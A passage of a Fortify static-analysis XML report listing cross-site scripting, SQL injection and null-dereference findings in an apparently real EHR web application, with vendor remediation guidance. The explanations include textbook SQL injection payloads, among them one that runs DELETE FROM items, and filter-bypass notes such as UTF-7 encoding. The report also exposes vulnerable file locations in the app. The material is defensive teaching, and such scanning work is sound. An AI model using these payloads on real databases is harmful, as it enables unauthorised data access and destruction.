- As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.


A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The solution to XSS is to ensure that validation occurs in the correct places and checks are made for the correct properties.

Because XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.

Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.

The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.

A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:

In the content of a block-level element (in the middle of a paragraph of text):

- "&lt;" is special because it introduces a tag.

- "&amp;" is special because it introduces a character entity.

- "&gt;" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening "&lt;", but omitted it in error.

The following principles apply to attribute values:

- In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value.

- In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value.

- In attribute values without any quotes, white-space characters, such as space and tab, are special.

- "&amp;" is special when used with certain attributes, because it introduces a character entity.

In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:

- Space, tab, and new line are special because they mark the end of the URL.

- "&amp;" is special because it either introduces a character entity or separates CGI parameters.

- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.

- The "%" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, "%" must be filtered if input such as "%68%65%6C%6C%6F" becomes "hello" when it appears on the web page in question.


Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:

- Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag.

Server-side scripts:

- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (") on output might require additional filtering.

Other possibilities:

- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).

After you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.

If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].

Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database.

2. Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities.

3. To differentiate between the data that are encoded and those that are not, use the Data Validation project template that groups the issues into folders based on the type of encoding applied to their source of input.

4. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>500</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="6153A927B7D5582EB508C812535EC3F5" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in adminindex.jsp uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>adminindex.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/adminindex.jsp</FilePath>
<LineStart>177</LineStart>
<Snippet>
&lt;div class="section_w940"&gt;
&lt;h2&gt;Welcome &lt;c:out value="&lt;%=l_welcomeMSG %&gt;"/&gt;&lt;/h2&gt;
	    	&lt;div class="product_box margin_r_20"&gt;
	        	&lt;h2&gt;&lt;spring:message code="User_Maintenance"/&gt;&lt;/h2&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SSOLoginRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/SSOLoginRequestHandler.java</FilePath>
<LineStart>324</LineStart>
<Snippet>		String l_sFnName = "readSSOUserDetails";

		l_sTemp = p_objRequest.getHeader(ECAMSSecurityConstants.PARAM_SSO_ID);

		if (m_objLogger.isDebugEnabled())</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8DCE6FBA08F01CD7E9D8B7B0191A6210" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in dlgCreateEmail.jsp uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>dlgCreateEmail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/audit/dlgCreateEmail.jsp</FilePath>
<LineStart>233</LineStart>
<Snippet>		%&gt;
		{
			emailSid:"&lt;c:out value="&lt;%=nlrEmailNotes[3]%&gt;"/&gt;",
			artifactHdrSid:"&lt;c:out value="&lt;%=nlrEmailNotes[4]%&gt;"/&gt;",
			createdBy:"&lt;c:out value="&lt;%=nlrEmailNotes[0]%&gt;"/&gt;",</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ProviderRegEmailDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/ProviderRegEmailDAOImpl.java</FilePath>
<LineStart>47</LineStart>
<Snippet>		Query q = em.createNativeQuery(EHRSQLConstants.SQL_GET_PRVDR_REG_AUDIT_EMAIL_EXIST.toString()+regAuditSid+" order by npre.NLR_PRVDR_REG_EMAIL_SID DESC", "emailHistory");
		List&lt;Object[]&gt; resultList =(List&lt;Object[]&gt;)q.getResultList();
		return (List&lt;Object[]&gt;)q.getResultList();
	}
	</Snippet>
<TargetFunction>javax.persistence.Query.getResultList()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3D4C6180463E970B7620C163606FEEAD" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in dlgAuditDetail.jsp uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>dlgAuditDetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/audit/dlgAuditDetail.jsp</FilePath>
<LineStart>326</LineStart>
<Snippet>        &lt;td width="20%" align="right"&gt;&lt;h4&gt;Audit Type:&amp;nbsp;&amp;nbsp;&lt;/h4&gt;&lt;/td&gt;
        &lt;td width="25%"&gt;
        	&lt;h5&gt;&lt;c:out value="&lt;%=l_auditTypesMap.get(nlrPrvdrRegAuditFormBean.getAuditTypeLkpcd())%&gt;"/&gt;
        	&lt;/h5&gt;
        &lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AuditViewDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/AuditViewDAOImpl.java</FilePath>
<LineStart>87</LineStart>
<Snippet>		q = m_ObjEntityManager.createQuery(EHRSQLConstants.SQL_GET_AUDIT_TYPE_LIST.toString());
		q.setParameter(1, l_domainCid);
		return (List&lt;EHRLookupValue&gt;) q.getResultList();
	}
</Snippet>
<TargetFunction>javax.persistence.Query.getResultList()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C04FE1555F6837D901C7B7D657D97E34" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in dlgAuditDetail.jsp uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>dlgAuditDetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/audit/dlgAuditDetail.jsp</FilePath>
<LineStart>339</LineStart>
<Snippet>        &lt;td width="20%" align="right"&gt;&lt;h4&gt;Audit Status:&amp;nbsp;&amp;nbsp;&lt;/h4&gt;&lt;/td&gt;
        &lt;td width="25%"&gt;
        	&lt;h5&gt;&lt;c:out value="&lt;%=l_allAuditStatusMap.get(String.valueOf(nlrPrvdrRegAuditFormBean.getEhrStatusCid()))%&gt;"/&gt;
        	&lt;/h5&gt;
        &lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AuditViewDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/AuditViewDAOImpl.java</FilePath>
<LineStart>109</LineStart>
<Snippet>		Query q = null;
		q = m_ObjEntityManager.createQuery(EHRSQLConstants.SQL_GET_AUDIT_STATUS_LIST.toString());
		return (List&lt;EHRStatus&gt;) q.getResultList();
	}
</Snippet>
<TargetFunction>javax.persistence.Query.getResultList()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B1DA9F6FABA26F737FEB861232BACB73" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in adminindex.jsp uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>adminindex.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/adminindex.jsp</FilePath>
<LineStart>177</LineStart>
<Snippet>
&lt;div class="section_w940"&gt;
&lt;h2&gt;Welcome &lt;c:out value="&lt;%=l_welcomeMSG %&gt;"/&gt;&lt;/h2&gt;
	    	&lt;div class="product_box margin_r_20"&gt;
	        	&lt;h2&gt;&lt;spring:message code="User_Maintenance"/&gt;&lt;/h2&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SSOLoginRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/SSOLoginRequestHandler.java</FilePath>
<LineStart>332</LineStart>
<Snippet>		if (l_sTemp == null) {
			l_SSOUserDetails.setSSOID(((String) p_objRequest
					.getParameter(ECAMSSecurityConstants.REQ_PARAM_SSO_ID))
					.toLowerCase());
		} else {</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="410">
                        <groupTitle>SQL Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>On line 2268 of DbUtilImpl.java, the method executeUpdateStmt() invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>SQL injection errors occur when:

1. Data enters a program from an untrusted source.



2. The data is used to dynamically construct a SQL query.



Example 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.


...
	String userName = ctx.getAuthenticatedUserName();
	String itemName = request.getParameter("itemName");
	String query = "SELECT * FROM items WHERE owner = '"
				+ userName + "' AND itemname = '"
				+ itemName + "'";
	ResultSet rs = stmt.execute(query);
...


The query intends to execute the following code:


	SELECT * FROM items
	WHERE owner = &lt;userName&gt;
	AND itemname = &lt;itemName&gt;;


However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string "name' OR 'a'='a" for itemName, then the query becomes the following:


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name' OR 'a'='a';


The addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:


	SELECT * FROM items;


This simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.

Example 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string "name'; DELETE FROM items; --" for itemName, then the query becomes the following two queries:


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	--'


Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.

Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a", the following three valid statements will be created:


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	SELECT * FROM items WHERE 'a'='a';


Some think that in the mobile world, classic web application vulnerabilities, such as SQL injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.

Example 3: The following code adapts Example 1 to the Android platform.


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String itemName = this.getIntent().getExtras().getString("itemName");
        String query = "SELECT * FROM items WHERE owner = '"
                                + userName + "' AND itemname = '"
                                + itemName + "'";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, null);
...


One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:

    - Target fields that are not quoted
    - Find ways to bypass the need for certain escaped metacharacters
    - Use stored procedures to hide the injected metacharacters

Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.

Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.

Example 1 can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:


...
	String userName = ctx.getAuthenticatedUserName();
	String itemName = request.getParameter("itemName");
	String query = "SELECT * FROM items WHERE itemname=? AND owner=?";
	PreparedStatement stmt = conn.prepareStatement(query);
	stmt.setString(1, itemName);
	stmt.setString(2, userName);
	ResultSet results = stmt.execute();
...


And here is an Android equivalent:


...
	PasswordAuthentication pa = authenticator.getPasswordAuthentication();
	String userName = pa.getUserName();
	String itemName = this.getIntent().getExtras().getString("itemName");
	String query = "SELECT * FROM items WHERE itemname=? AND owner=?";
	SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
	Cursor c = db.rawQuery(query, new Object[]{itemName, userName});
...


More complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. A common mistake is to use parameterized SQL statements that are constructed by concatenating user-controlled strings. Of course, this defeats the purpose of using parameterized SQL statements. If you are not certain that the strings used to form parameterized statements are constants controlled by the application, do not assume that they are safe because they are not being executed directly as SQL strings. Thoroughly investigate all uses of user-controlled strings in SQL statements and verify that none can be used to modify the meaning of the query.

2. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>410</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="53796A2466B5EA4E82F121DE51EA5D3B" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 2549 of DbUtilImpl.java, the method executeBatch() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>2549</LineStart>
<Snippet>                else
                {
                    l_stStatement.execute(b_stempString);
                }
            }</Snippet>
<TargetFunction>execute()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D26E2E62A346F11C3E2F8417B649CDC7" ruleID="AB181F77-DEC9-44BE-A798-47D9CBA60BD0">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 2337 of DbUtilImpl.java, the method executeBatch() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>2337</LineStart>
<Snippet>
            // prepare the statement
            l_psPreparedStatement = p_conDbConn.prepareStatement(p_sInsertQuery);

            // Strings to hold the tokens for each record</Snippet>
<TargetFunction>prepareStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B0F52E476C950D410F8AF73F9D0C5CF8" ruleID="AB181F77-DEC9-44BE-A798-47D9CBA60BD0">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 2738 of DbUtilImpl.java, the method insertBatchData() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>2738</LineStart>
<Snippet>
            // prepared statement for insert
            l_psPreparedStatement = p_conDbConn.prepareStatement(p_sInsertQuery);

            // String to hold coulmn value temporarily</Snippet>
<TargetFunction>prepareStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5D154299301F986D745DEEAA5AF391AB" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 2268 of DbUtilImpl.java, the method executeUpdateStmt() invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>2268</LineStart>
<Snippet>            // create a statement and execute the update statement
            l_stUpdateStatement = p_conDbConn.createStatement();
            l_iUpdatedRecords = l_stUpdateStatement.executeUpdate(p_sUpdateQuery);
        }
        catch (SQLException exsql)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5110</LineStart>
<Snippet>                    ResultSet.CONCUR_READ_ONLY);

            l_rsResultSet = l_stQueryStatement.executeQuery(p_sQuery);

            Date l_objQueryEndDate = null;</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ABF7751275A7028383A35670568EE8C2" ruleID="39BE8C32-93A7-4A0B-9120-97C62E648C37">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 2545 of DbUtilImpl.java, the method executeBatch() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>2545</LineStart>
<Snippet>                if (l_bDoBatch)
                {
                    l_stStatement.addBatch(b_stempString);
                }
                else</Snippet>
<TargetFunction>addBatch()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="385">
                        <groupTitle>Missing Check against Null</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getFormBeanName() in CNSITagUtil.java can dereference a null-pointer on line 22 because it does not check the return value of getAttribute(), which might return null.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.

Two dubious assumptions that are easy to spot in code are "this function call can never fail" and "it doesn't matter if this function call fails". When a programmer ignores the return value from a function, they implicitly state that they are operating under one of these assumptions.



Example 1:  The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a null dereference.


String itemName = request.getParameter(ITEM_NAME);
	if (itemName.compareTo(IMPORTANT_ITEM)) {
		...
	}
	...


Example 2:. The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined.


System.clearProperty("os.name");
...
String os = System.getProperty("os.name");
if (os.equalsIgnoreCase("Windows 95") )
	System.out.println("Not supported");


The traditional defense of this coding error is:

"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value."

But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>If a function can return an error code or any other evidence of its success or failure, always check for the error condition, even if there is no obvious way for it to occur. In addition to preventing security errors, many initially mysterious bugs have eventually led back to a failed method call with an unchecked return value.

Create an easy to use and standard way for dealing with failure in your application. If error handling is straightforward, programmers will be less inclined to omit it. One approach to standardized error handling is to write wrappers around commonly-used functions that check and handle error conditions without additional programmer intervention. When wrappers are implemented and adopted, the use of non-wrapped equivalents can be prohibited and enforced by using custom rules.

Example 3: The following code implements a wrapper around getParameter() that checks the return value of getParameter() against null and uses a default value if the requested parameter is not defined.


String safeGetParameter (HttpRequest request, String name)
{
    String value = request.getParameter(name);
    if (value == null) {
        return getDefaultValue(name)
    }
    return value;
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Watch out for programmers who want to explain away this type of issue by saying "that can never happen because ...". Chances are good that they have developed their intuition about the way the system works by using their development workstation. If your software will eventually run under different operating systems, operating system versions, hardware configurations, or runtime environments, their intuition might not apply.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>385</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="6B1D0C5F5E3541FA61E0CFEA3C02FACA" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method readFormBeanMemberValue() in CNSITagUtil.java can dereference a null-pointer on line 31 because it does not check the return value of getAttribute(), which might return null.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
